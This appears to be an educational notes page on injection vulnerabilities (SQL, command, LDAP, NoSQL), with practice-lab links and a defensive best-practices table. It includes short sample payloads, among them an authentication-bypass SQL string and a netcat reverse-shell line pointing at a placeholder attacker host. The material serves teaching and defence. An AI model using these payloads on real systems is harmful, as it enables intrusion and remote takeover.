# Injection

## What is Injection

Injection attacks occur when untrusted input is sent to a code interpreter as part of a command or query. The attacker's input tricks the interpreter into executing unintended commands or accessing unauthorized data.

Injection vulnerabilities are caused by insecure handling of user-supplied data within interpreters (SQL, shell, LDAP, NoSQL, etc.). These vulnerabilities are often found in legacy systems, weakly validated inputs, or poorly written parsing logic. Advanced exploitation can result in full system compromise, lateral movement, or data exfiltration.

## Common Examples

- Putting code in a search bar – Can crash the site or give private info.
- Using fake input in a contact form – Could send harmful commands to the server.
- Entering code in a comment section – Might make the page act weird or dangerous.
- SQL Injection (SQLi) – e.g., SELECT * FROM users WHERE name = '$input'. An attacker supplies input like ' OR 1=1-- to bypass authentication.
- Command Injection – e.g., calling os.system("ping " + userInput), which allows execution of arbitrary system commands.
- LDAP Injection – Manipulating LDAP queries, e.g., (&(user=$input)(password=...)) with * or )(uid=*).
- XPath Injection – Exploiting XML query paths by modifying input to access unauthorized nodes.
- NoSQL Injection – e.g., injecting JSON-like structures into MongoDB queries to bypass access controls.
- Time-based Blind SQL Injection – e.g., using payloads like '; IF (1=1) WAITFOR DELAY '0:0:5'-- to infer true/false based on response time.
- Bash Command Injection – Payloads like ; nc attacker.com 4444 -e /bin/bash in vulnerable shell execution points.
- Stored Injection in an API – Injecting malicious SQL/commands into backend via seemingly safe API fields.
- Object Injection in PHP – Crafting serialized PHP objects to trigger magic methods leading to RCE or file disclosure.
- Polyglot Payloads – Payloads crafted to simultaneously exploit multiple interpreters (e.g., JavaScript and SQL in hybrid injection scenarios).

## Practice Exploiting Injection

### PortSwigger

PortSwigger has multiple labs to see this vulnerability in action. The labs are online and require an account. Here are some labs:

- [SQL Injection](https://portswigger.net/web-security/all-labs#sql-injection)
- [NoSQL Injection](https://portswigger.net/web-security/all-labs#nosql-injection)
- [XML External Entity (XXE) Injection](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)

### OWASP Juice Shop

The OWASP Juice Shop is an open-source project that is intentionally vulnerable. It has many vulnerabilities and makes finding them a bit of a game using their scoreboard page. It can be accessed with Heroku or using Docker. I ran it using Docker and I seem to recall that one of the vulnerabilities will not work properly if you use Heroku. More information on the project and how to run it can [be found here](https://owasp.org/www-project-juice-shop/).

### TryHackMe

TryHackMe has a couple rooms dedicated to this subject. The rooms are online and require an account. Here are some links to rooms that talk about Injection:

- [OWASP Top 10 - 2021](https://tryhackme.com/room/owasptop102021)
- [Injection Attacks Module](https://tryhackme.com/module/injection-attacks)
- [Advanced SQL Injection](https://tryhackme.com/room/advancedsqlinjection)
- [SQL Injection Lab](https://tryhackme.com/room/sqlilab)
- [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)

## Write Ups

Here are some write ups that I have done that involve injection:

### Vulnerabilities

- [Local File Injection](/vulnerabilities/local_file_injection.md)

### TryHackMe

- [Archangel](/write_ups/try_hack_me/archangel.md)
- [Chill Hack](/write_ups/try_hack_me/chill_hack.md)
- [Ignite](/write_ups/try_hack_me/ignite.md)
- [JPGChat](/write_ups/try_hack_me/jpg_chat.md)

## Best Practices

| Best Practice | Why It Matters |
| ------------- | -------------- |
| Use Parameterized Queries (Prepared Statements) | Prevents attackers from injecting malicious code by separating data from commands. |
| Employ Input Validation and Sanitization | Ensures only expected data is processed, reducing the risk of malicious input. |
| Implement Least Privilege Access Controls | Limits the potential impact if an injection attack succeeds by restricting user permissions. |
| Avoid Dynamic SQL Generation | Reduces the risk of injection by not constructing queries with user input directly. |
| Use ORM Frameworks with Caution | While ORMs can help prevent injection, improper use can still lead to vulnerabilities. |
| Escape User Input Appropriately | Escaping special characters can prevent input from being interpreted as code. |
| Regularly Update and Patch Systems | Keeps systems protected against known vulnerabilities that could be exploited via injection. |
| Implement Web Application Firewalls (WAFs) | Provides an additional layer of defense by filtering out malicious input before it reaches the application. |
| Conduct Regular Security Testing | Identifies potential injection vulnerabilities before they can be exploited. |
| Educate Developers on Secure Coding Practices | Awareness and training can prevent the introduction of injection vulnerabilities during development. |

## Summary

Like many of the vulnerabilities in the OWASP Top Ten, the Injection vulnerability stems from trusting user data. All input from external systems and user data should be cleaned and sanitized. Until recently, this was the top item on the OWASP Top Ten list. This vulnerability can range from getting account access, getting unauthorized data and remote code execution. Do not trust user data.
